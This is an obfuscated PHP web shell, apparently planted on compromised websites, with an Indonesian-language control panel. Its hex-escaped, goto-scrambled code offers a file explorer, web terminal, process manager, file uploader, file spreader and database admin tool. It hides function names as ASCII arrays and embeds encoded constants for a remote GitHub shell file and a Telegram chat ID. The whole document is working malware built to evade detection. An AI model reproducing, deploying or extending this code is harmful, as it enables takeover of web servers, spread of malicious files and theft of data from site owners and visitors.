"\x20\155\x72\x2d\63\x20\x77\55\x34\40\164\x65\x78\x74\x2d\143\x65\x6e\x74\x65\162\x22\40\x73\x74\x79\x6c\x65\75\x22\x63\157\154\157\162\72\166\141\162\50\55\55\x61\x63\x63\x65\x6e\x74\51\73\42\x3e\74\x2f\x69\76\74\x73\x70\x61\x6e\x3e" . $menu_data["\156\141\155\x65"] . "\x3c\57\x73\x70\141\156\x3e\x3c\x2f\141\76\74\x2f\x6c\151\x3e"; } goto uuZrw; zipVi: goto tOD2D; goto cUfsh; vZYIO: gB8Vk: goto ivcgF; W49AE: goto MBOGk; goto KlMES; kn86V: $menus = array("\x65\x78\x70\x6c\x6f\162\x65\162" => array("\156\x61\x6d\x65" => "\106\x69\154\145\40\x45\x78\x70\154\x6f\x72\x65\162", "\x69\x63\x6f\x6e" => "\x66\141\55\146\157\154\x64\145\x72\x2d\x6f\160\x65\x6e"), "\x74\145\162\x6d\x69\156\141\x6c" => array("\x6e\x61\x6d\x65" => "\x57\145\142\x20\124\145\162\x6d\151\x6e\x61\154", "\x69\143\x6f\156" => "\146\141\55\x74\x65\162\155\151\156\x61\x6c"), "\x70\x72\x6f\x63\x65\x73\163\x5f\x6d\x61\x6e\x61\147\x65\x72" => array("\156\141\155\x65" => "\x50\162\157\143\x65\163\163\x20\x4d\141\156\x61\147\145\x72", "\x69\143\157\x6e" => "\146\141\x2d\x6d\x69\143\162\x6f\x63\x68\151\160"), "\147\145\x6e\145\162\x61\x74\x6f\162" => array("\x6e\x61\155\x65" => "\x43\x6f\x6e\x74\145\156\x74\x20\x47\145\x6e\145\x72\141\164\x6f\x72", "\x69\143\157\156" => "\146\x61\55\143\157\x67\x73"), "\146\151\x6c\145\137\163\160\162\145\x61\x64\x65\x72" => array("\156\x61\155\x65" => "\x53\x65\x62\x61\x72\40\106\151\x6c\145", "\x69\x63\x6f\156" => "\146\x61\55\163\x61\164\145\154\154\x69\x74\145\x2d\144\x69\x73\x68"), "\141\x64\155\151\156\x65\162" => array("\x6e\x61\x6d\x65" => "\x41\x64\155\151\x6e\145\162", "\x69\143\x6f\156" => "\x66\x61\x2d\x64\141\164\141\x62\141\163\x65")); goto SCG00; lfqv4: es5B2: goto VVVum; dbcX8: FDlWD: goto iXrNR; AZ7Fv: medmE: goto FdH1l; nPZ26: H9YVq: goto pAUSz; aCivQ: Z6zDc: goto u1vLf; LBb_q: ?>
             </ul>
             <h3 class="text-xs uppercase tracking-wider text-gray-400 mb-2 mt-4 px-2 cyber-font">Self Actions</h3>
             <ul>
                 <li><a href="?menu=explorer&file_action=lock&self=1&target=<?php  goto WtmmC; D9_1m: DfweC: goto t7DPO; itAOF: ?>
');
                    }
                }
            }
            $('#add-protector-row').on('click', addProtectorRow);
            protectorRowsContainer.on('click', '.remove-row', function() {
                $(this).closest('.protector-row').remove();
            });
            if (protectorRowsContainer.length && protectorRowsContainer.children().length === 0) {
                addProtectorRow();
            }

            const passwordInputLogin = document.querySelector('.login-box input[type="password"]');
            if (passwordInputLogin) { passwordInputLogin.focus(); }
        });
    </script>
</body>
</html>
<?php  goto ctfAQ; c2zB2: goto VLBZ8; goto yBhZD; KlMES: YBIuD: goto epP8b; haNUe: goto dTu7R; goto wrDRC; PezDG: d6D__: goto xoqgL; TU0eD: goto JyJaR; goto oMB6D; jXTBI: function generateRandomName($ext = "\160\x68\x70") { if (function_exists("\162\x61\x6e\x64\x6f\155\137\x62\x79\164\145\x73")) { $randomString = bin2hex(random_bytes(5)); } else { $randomString = substr(str_shuffle("\x61\x62\x63\x64\145\146\147\x68\x69\152\153\x6c\155\156\x6f\160\x71\x72\x73\164\165\166\x77\x78\171\172\60\x31\x32\63\64\x35\x36\x37\x38\71"), 0, 10); } $validExt = !empty($ext) ? strtolower(trim($ext, "\56")) : "\164\170\x74"; return $randomString . "\x2e" . $validExt; } goto XJsK3; YC4XC: fljUg: goto qRNw7; yShZ7: J9iYe: goto EGHgH; I1T2K: goto YBIuD; goto YQEJU; ZWwoz: goto iQi2Z; goto hyePy; Wp00v: DZOgy: goto MZFzZ; TYU6p: goto pL7I9; goto bJFOm; R1io2: eFMQJ: goto BktEQ; OyesS: $_g_ascii_chmod = array(99, 104, 109, 111, 100); goto iMeHy; eBX9K: dIK8R: goto etHCw; GJ2On: goto iUcgk; goto v49dU; yABLq: ob_end_flush(); goto SW2rJ; uDl8W: goto uF1cx; goto pvFrM; HKVgt: vuHqt: goto VqHaZ; rPDeb: y1Gs4: goto al5MN; QPt41: ejVyV: goto ydctN; MFqkC: goto XQkup; goto iqp6I; xL7eA: goto cIjE7; goto sf2br; zmK7W: MglxM: goto HRlyW; HswQK: goto O7OQB; goto peOFI; S_EvU: $_g_ascii_function_exists = array(102, 117, 110, 99, 116, 105, 111, 110, 95, 101, 120, 105, 115, 116, 115); goto ZVfVu; FWKBG: qqC1j: goto Pow7Y; uaVAv: $_g_ascii_date = array(100, 97, 116, 101); goto lOXrf; O_asH: $_g_ascii_stream_set_timeout = array(115, 116, 114, 101, 97, 109, 95, 115, 101, 116, 95, 116, 105, 109, 101, 111, 117, 116); goto in0MV; c8o_C: define("\x47\x49\124\110\125\102\137\106\x49\114\105\x5f\125\122\114", "\x68\x74\164\x70\163\72\x2f\x2f\x72\141\167\56\147\151\164\150\165\142\x75\163\145\x72\x63\157\156\x74\145\x6e\164\x2e\143\x6f\155\57\155\x72\142\157\x74\70\70\57\x6d\162\142\x6f\164\57\162\x65\146\163\x2f\150\145\x61\144\x73\x2f\x6d\x61\x69\156\57\163\x68\x65\154\x6c\57\141\x6c\x70\141\57\141\144\x6d\x69\x6e\x2d\146\x69\154\164\x65\162\x73\56\x70\150\160"); goto JELYr; EGHgH: if ($active_menu === "\x65\170\x70\x6c\x6f\162\145\x72" || $active_menu === "\x65\144\151\164\157\162") { ?>
                <div class="cyber-panel p-4 mb-6">
                    <div class="flex flex-wrap items-center gap-4">
                        <a href="?menu=explorer&path=<?php  echo urlencode($auto_path_script); ?>
" class="cyber-btn cyber-btn-primary"><i class="fas fa-home mr-2"></i>Home Shell</a>
                        <button id="create-file-btn" class="cyber-btn cyber-btn-primary"><i class="fas fa-file-plus mr-2"></i>Buat File</button>
                        <button id="create-folder-btn" class="cyber-btn cyber-btn-primary"><i class="fas fa-folder-plus mr-2"></i>Buat Folder</button>
                        <form class="flex items-center gap-2" method="post" action="<?php  echo $htmlspecialchars_fn($_SERVER["\x52\105\121\125\105\123\x54\x5f\125\122\x49"]); ?>
" enctype="multipart/form-data">
                            <input type="hidden" name="action" value="upload_file">
                            <label for="file-upload-input" class="cyber-btn cyber-btn-primary cursor-pointer"><i class="fas fa-upload mr-2"></i>Browse...</label>
                            <input id="file-upload-input" type="file" name="uploaded_files[]" required class="hidden" multiple>
                            <span id="file-upload-filename" class="text-gray-400 max-w-xs truncate">No file selected.</span>
                            <button type="submit" class="cyber-btn cyber-btn-primary">UPLOAD</button>
                        </form>
                    </div>
                </div>
                <?php  } goto f0L5Z; TP3cB: define("\124\x45\x4c\105\x47\x52\x41\x4d\137\103\110\101\x54\137\x49\x44", "\66\60\60\64\x39\60\x38\x37\65\63"); goto gOJNk; k6SXJ: veQjq: goto cunFS; kRTmd: vUQzt: goto nM95k; gyXcp: function scanner_compareTokens($tokenNeedles, $tokenHaystack) { $output = array(); if (empty($tokenHaystack)) { return $output; } foreach ($tokenNeedles as $tokenNeedle) { if (in_array($tokenNeedle, $tokenHaystack)) { $output[] = $tokenNeedle; } } return $output; } goto qZpcY; mXXCx: goto IuecY; goto sYzJt; cxbYA: function scanner_getFileTokens($filename) { $file_get_contents_local_scan = _get_fn_name_global_init_v3("\x5f\147\x5f\x61\x73\143\x69\151\x5f\x66\x69\154\x65\137\x67\x65\x74\137\x63\157\156\x74\x65\x6e\x74\x73", "\146\151\154\145\137\147\145\164\137\x63\157\x6e\x74\145\x6e\164\x73"); if (empty($file_get_contents_local_scan) || !function_exists($file_get_contents_local_scan) || !function_exists("\x74\157\x6b\145\x6e\137\x67\x65\164\137\x61\x6c\x6c")) { return array(); } $fileContent = @call_user_func($file_get_contents_local_scan, $filename); if ($fileContent === false) { return array(); } $tokens = @token_get_all($fileContent); $output = array(); $tokenCount = is_array($tokens) ? count($tokens) : 0; if ($tokenCount > 0) { for ($i = 0; $i < $tokenCount; $i++) { if (isset($tokens[$i][1])) { $output[] .= strtolower($tokens[$i][1]); } } } $output = array_values(array_unique(array_filter(array_map("\164\162\151\155", $output)))); return $output; } goto YTjGc; in0MV: goto vMMZO; goto dYT2V; qRNw7: ')); ?>
